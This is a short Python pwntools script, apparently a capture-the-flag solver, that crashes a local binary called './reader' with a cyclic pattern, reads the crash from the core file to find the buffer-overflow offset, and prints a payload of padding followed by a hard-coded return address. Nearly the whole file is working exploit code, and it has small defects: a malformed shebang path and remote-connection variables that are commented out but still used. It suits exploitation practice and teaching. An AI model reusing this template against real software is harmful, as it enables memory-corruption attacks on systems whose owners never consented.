#!/usr/env/python3
from pwn import *

##Setup context
#enable coredumps
os.system('ulimit -c unlimited')#TODO:find command the enables coredumps on all systems
context.terminal = ['tmux', 'new-window']# Sets the terminal to be opened if gdb is used

## Change filename and local
filename = './reader'
elf = context.binary = ELF(filename)
libc = elf.libc
# remote_url = '0.cloud.chals.io'
# remote_port = 11723

local = "-r" not in sys.argv
debug = "-d" in sys.argv
context.log_level = 'debug' if '-v' in sys.argv else 'info'

#this line enabels pwntools to overwrite core files
if os.path.exists('core'): os.unlink('core')

#This creates a packer and unpacker for the correponding architecture e.g p64() for x64 ans p32() for i386
p = make_packer()
u = make_unpacker()

def getP(local=local):
    if local: 
        p = process(filename) 
        if debug:
            gdb.attach(p, 'c\n')
        return p
    else:
        return remote(remote_url, remote_port)

##Find offset for bufoverflow
def findOffset(process):
    payload = cyclic(1000)
    process.sendline(payload)
    process.wait()
    core = process.corefile
    if context.arch == 'amd64':
        stack = core.rsp
        pattern = core.read(stack, 4)
        offset = cyclic_find(pattern)
    elif context.arch == 'i386':
        # Our cyclic pattern should have been used as the crashing address
        assert pack(core.eip) in payload
        offset = cyclic_find(core.eip)
    else:
        error('The architecture %s is currently not supported', context.arch)
    return offset

offset = findOffset(getP(local=True))
success('Found offset: %d', offset)

key = p32(0x08049208)

print(b'r'*(offset-4) + key)
